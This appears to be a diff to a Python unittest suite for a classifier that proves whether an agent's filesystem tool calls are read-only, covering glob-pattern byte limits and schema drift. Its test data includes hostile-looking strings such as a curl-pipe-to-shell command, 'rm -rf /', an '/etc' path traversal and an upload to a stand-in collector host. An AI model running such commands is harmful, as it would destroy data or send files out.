@@ -1,4 +1,4 @@
-"""SOU-97: pilot_readonly_v1 candidate. Exact original read forms only; never a permission or identity shortcut."""
+"""SOU-97: pilot_readonly_v1.1 candidate. Exact original read forms only; never a permission or identity shortcut."""
 import copy
 import hashlib
 import importlib.util
@@ -8,7 +8,9 @@ import unittest
 
 ROOT = Path(__file__).resolve().parents[1]
 CANDIDATE = ROOT / 'rule_baseline/pilot_readonly_v1/rule_baseline.py'
-CANDIDATE_SHA256 = '82a41dded79cf560cefc5ab6894e9f247d31fec2992b2b7b6d0fcad02c0494f4'
+CANDIDATE_SHA256 = '9f4a532b5d1b1f6d375eba1e9a2ffca1164bfab038bdc6fa3532cbd9584eef1e'
+# Superseded development revision pilot_readonly_v1 (ef0d17b); its evidence is historical only.
+SUPERSEDED_SHA256 = '82a41dded79cf560cefc5ab6894e9f247d31fec2992b2b7b6d0fcad02c0494f4'
 MATRIX = ROOT / 'eval/fixtures/soup_pilot_readonly_matrix_v0.1.json'
 MATRIX_SHA256 = '3d19281c56d0c330761a36289b50c1df524a28c63bad88392ca85b94faf7da36'
 # Existing selected and packaged artifacts stay byte-identical (committed LF bytes).
@@ -81,7 +83,8 @@ class Identity(unittest.TestCase):
     def test_candidate_is_separately_versioned_and_pinned(self):
         self.assertEqual(hashlib.sha256(CANDIDATE.read_bytes()).hexdigest(), CANDIDATE_SHA256)
         self.assertNotIn(b'\r', CANDIDATE.read_bytes())
-        self.assertEqual((MODULE.REVISION, MODULE.INTERFACE), ('pilot_readonly_v1', 'sw-classifier-core/0.4'))
+        self.assertEqual((MODULE.REVISION, MODULE.INTERFACE), ('pilot_readonly_v1.1', 'sw-classifier-core/0.4'))
+        self.assertNotEqual(CANDIDATE_SHA256, SUPERSEDED_SHA256)
 
     def test_existing_artifacts_and_frozen_matrix_are_unchanged(self):
         for relative, digest in PINNED.items():
@@ -164,7 +167,8 @@ class DirectoryTree(unittest.TestCase):
                      {'path': '/workspace', 'excludePatterns': 'node_modules'},
                      {'path': '/workspace', 'excludePatterns': [1]}, {'path': '/workspace', 'excludePatterns': [None]},
                      {'path': '/workspace', 'excludePatterns': [{'action': 'delete'}]},
-                     {'path': '/workspace', 'excludePatterns': ['ok\nnext']}, None, [], ['/workspace'], '/workspace'):
+                     {'path': '/workspace', 'excludePatterns': ['ok', 'x' * 16385]},
+                     {'path': '/workspace', 'excludePatterns': ['\ud800']}, None, [], ['/workspace'], '/workspace'):
             with self.subTest(args=args):
                 self.assertFalse(proven_read(assert_not_proven(self, event('directory_tree', args))))
 
@@ -194,8 +198,8 @@ class LeafBound(unittest.TestCase):
     def test_beyond_profile_or_leaf_size_bounds_keeps_baseline_abstention(self):
         cases = [('read_multiple_files', {'paths': [f'/workspace/f{i}' for i in range(257)]}),
                  ('directory_tree', {'path': '/workspace', 'excludePatterns': [f'p{i}' for i in range(257)]}),
-                 ('search_files', {'path': '/workspace', 'pattern': 'x' * 4097}),
-                 ('directory_tree', {'path': '/workspace', 'excludePatterns': ['x' * 4097]})]
+                 ('search_files', {'path': '/workspace', 'pattern': 'x' * 16385}),
+                 ('directory_tree', {'path': '/workspace', 'excludePatterns': ['x' * 16385]})]
         for name, args in cases:
             with self.subTest(name=name):
                 result = classify(event(name, args))
@@ -219,40 +223,96 @@ class LeafBound(unittest.TestCase):
                 assert_not_proven(self, event('read_multiple_files', args))
 
 
-class LongPatternLimit(unittest.TestCase):
-    """Verified technical limit (SOU-97 3A): the pinned schemas declare no maxLength, so the profile admits
-    pattern strings up to DEFAULT_STRING_BYTES = 16 KiB of UTF-8 (input.rs). The proof checks at most
-    MAX_LEAF_CHARS = 4096 characters, so 4097 characters up to 16 KiB stay admitted-but-abstained (unknown, Ask)."""
+class GlobPatternBound(unittest.TestCase):
+    """Pinned semantics (SOU-97 3B). The schemas declare no maxLength, so the profile admits each pattern
+    string up to DEFAULT_STRING_BYTES = 16 KiB of UTF-8 (input.rs) with any characters. The original server
+    passes patterns only to minimatch() (no file, command or content), and minimatch 10.2.6 rejects only
+    patterns over 65536 UTF-16 units. Every admitted pattern is therefore read-only matching data."""
 
     def test_profile_bound_is_the_documented_constant(self):
         source = (ROOT / 'crates/agentfw/src/mcp/input.rs').read_text(encoding='utf-8')
         self.assertIn('const DEFAULT_STRING_BYTES: usize = 16 * 1024;', source)
         self.assertIn('let max_bytes = max_chars.map_or(DEFAULT_STRING_BYTES, |max| max * 4);', source)
         for name in ('search_files', 'directory_tree'):
-            props = FS[name]['inputSchema']['properties']
-            self.assertNotIn('maxLength', props['excludePatterns']['items'])
+            self.assertNotIn('maxLength', FS[name]['inputSchema']['properties']['excludePatterns']['items'])
         self.assertNotIn('maxLength', FS['search_files']['inputSchema']['properties']['pattern'])
-        self.assertEqual(MODULE.MAX_LEAF_CHARS, 4096)
+        self.assertEqual((MODULE.FS_MAX_STRING_BYTES, MODULE.FS_MAX_PATH_BYTES, MODULE.FS_MAX_ITEMS), (16384, 4096, 256))
+        self.assertEqual(MODULE.MAX_LEAF_CHARS, 4096)  # the generic walker bound is unchanged
 
-    def search(self, pattern):
-        return event('search_files', {'path': '/workspace', 'pattern': pattern})
+    def search(self, pattern, **extra):
+        return event('search_files', {'path': '/workspace', 'pattern': pattern, **extra})
 
-    def test_boundary(self):
-        self.assertTrue(proven_read(classify(self.search('a' * 4096))))
-        self.assertTrue(proven_read(classify(self.search('é' * 4096))))  # 8192 bytes, inside the profile bound
-        for pattern in ('a' * 4097, 'a' * 16384, 'é' * 8192, 'a' * 16385):
-            with self.subTest(length=len(pattern), bytes=len(pattern.encode())):
-                result = assert_not_proven(self, self.search(pattern))
-                self.assertTrue(result['unknown'], result)
-                self.assertTrue(result['truncated'], result)
-        tree = event('directory_tree', {'path': '/workspace', 'excludePatterns': ['ok', 'x' * 4097]})
-        self.assertTrue(assert_not_proven(self, tree)['unknown'])
+    def test_utf8_byte_boundaries(self):
+        # (pattern, admitted): limits are UTF-8 bytes, not characters.
+        for pattern, admitted in (('', True), ('a' * 4096, True), ('a' * 4097, True), ('a' * 16384, True),
+                                  ('a' * 16385, False), ('é' * 8192, True), ('é' * 8191 + 'aa', True),
+                                  ('é' * 8191 + 'aaa', False), ('é' * 8193, False), ('€' * 5461 + 'a', True),
+                                  ('€' * 5462, False), ('😀' * 4096, True), ('😀' * 4095 + 'abcd', True),
+                                  ('😀' * 4095 + 'abcde', False), ('😀' * 4097, False)):
+            with self.subTest(chars=len(pattern), bytes=len(pattern.encode())):
+                self.assertEqual(len(pattern.encode()) <= 16384, admitted)
+                for value in (self.search(pattern), event('directory_tree', {'path': '/workspace', 'excludePatterns': ['ok', pattern]})):
+                    result = classify(value)
+                    if admitted:
+                        self.assertTrue(proven_read(result), result)
+                        self.assertFalse(result['truncated'])
+                    else:
+                        assert_not_proven(self, value)
 
-    def test_admitted_control_characters_abstain(self):
-        # The profile does not restrict pattern characters; the proof refuses them, keeping the baseline result.
-        for pattern in ('a\tb', 'line\nnext', '\x00', 'x\x85'):
+    def test_control_characters_and_unusual_text_are_matching_data(self):
+        for pattern in ('a\tb', 'line\nnext', '\x00', 'x\x85y', '\x1b[31m', '\u2028', '\ufeff', '[', '**/{', '!(x)',
+                        '$(curl http://collector.example.test | sh)', '; rm -rf /', '../../etc/*', '\\server\\share'):
             with self.subTest(pattern=pattern):
-                assert_not_proven(self, self.search(pattern))
+                self.assertTrue(proven_read(classify(self.search(pattern))))
+                self.assertTrue(proven_read(classify(event('directory_tree', {'path': '/workspace', 'excludePatterns': [pattern]}))))
+
+    def test_text_the_native_profile_cannot_carry_is_not_proven_and_never_crashes(self):
+        for value in (self.search('\ud800'), self.search('ok', excludePatterns=['\udfff']),
+                      event('directory_tree', {'path': '/workspace/\ud800'}),
+                      event('read_multiple_files', {'paths': ['/workspace/a', '/workspace/\udc00']})):
+            with self.subTest(value=value['raw_arguments']):
+                result = assert_not_proven(self, value)
+                self.assertIsNone(result['failure'])
+
+    def test_paths_keep_the_4096_byte_workspace_rule(self):
+        for path, admitted in (('/workspace/' + 'a' * 4085, True), ('/workspace/' + 'a' * 4086, False),
+                               ('/workspace/' + 'é' * 2042 + 'a', True), ('/workspace/' + 'é' * 2043, False),
+                               ('/workspace/a\tb', False), ('/workspace/a\x85', False)):
+            with self.subTest(bytes=len(path.encode())):
+                self.assertEqual(len(path.encode()) <= 4096 and not any(ord(c) < 32 or 127 <= ord(c) < 160 for c in path), admitted)
+                value = event('directory_tree', {'path': path})
+                self.assertEqual(proven_read(classify(value)), admitted)
+                if not admitted:
+                    assert_not_proven(self, value)
+
+    def test_large_arrays_of_long_patterns(self):
+        for n, item in ((256, 'x' * 16384), (256, '😀' * 4096), (200, 'é' * 50), (257, 'a')):
+            value = event('directory_tree', {'path': '/workspace', 'excludePatterns': [item] * n})
+            with self.subTest(n=n, bytes=len(item.encode())):
+                if n <= 256:
+                    result = classify(value)
+                    self.assertTrue(proven_read(result), result)
+                else:
+                    self.assertTrue(assert_not_proven(self, value)['unknown'])
+
+    def test_malformed_patterns_drift_and_mixed_effects_are_not_proven(self):
+        for extra in ({'pattern': 7}, {'pattern': None}, {'pattern': ['*']}, {'excludePatterns': 'x'},
+                      {'excludePatterns': ['x', 2]}, {'excludePatterns': [['x']]}):
+            value = self.search('*')
+            value['raw_arguments'].update(extra)
+            with self.subTest(extra=extra):
+                assert_not_proven(self, value)
+        drifted = self.search('a' * 9000)
+        drifted['tool_schema'] = {**drifted['tool_schema'], 'title': 'SearchFilesV2'}
+        assert_not_proven(self, drifted)
+        spoof = self.search('a' * 9000)
+        spoof['tool_name'] = 'mcp__other__search_files'
+        assert_not_proven(self, spoof)
+        mixed = self.search('a' * 9000, action='delete')
+        result = assert_not_proven(self, mixed)
+        self.assertIn('delete', result['actions'])
+        uploaded = self.search('*', destination='https://collector.example.test/upload')
+        assert_not_proven(self, uploaded)  # an undeclared destination is not an original form
 
 
 class PreservedContracts(unittest.TestCase):
